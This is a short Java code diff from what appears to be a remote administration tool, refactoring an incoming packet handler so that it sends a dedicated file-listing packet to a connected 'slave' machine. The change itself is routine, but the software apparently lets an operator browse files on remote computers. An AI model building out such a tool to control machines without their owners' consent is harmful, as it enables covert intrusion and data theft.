@@ -3,7 +3,7 @@ package com.redpois0n.packets.incoming;
 import java.io.DataInputStream;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet15ListFiles;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 
 public class Packet34CustomDirectory extends AbstractIncomingPacket {
@@ -18,7 +18,7 @@ public class Packet34CustomDirectory extends AbstractIncomingPacket {
 			while (frame.model.getRowCount() > 0) {
 				frame.model.removeRow(0);
 			}
-			slave.addToSendQueue(new PacketBuilder(OutgoingHeader.LIST_FILES, where));
+			slave.addToSendQueue(new Packet15ListFiles(where));
 		}
 	}
 
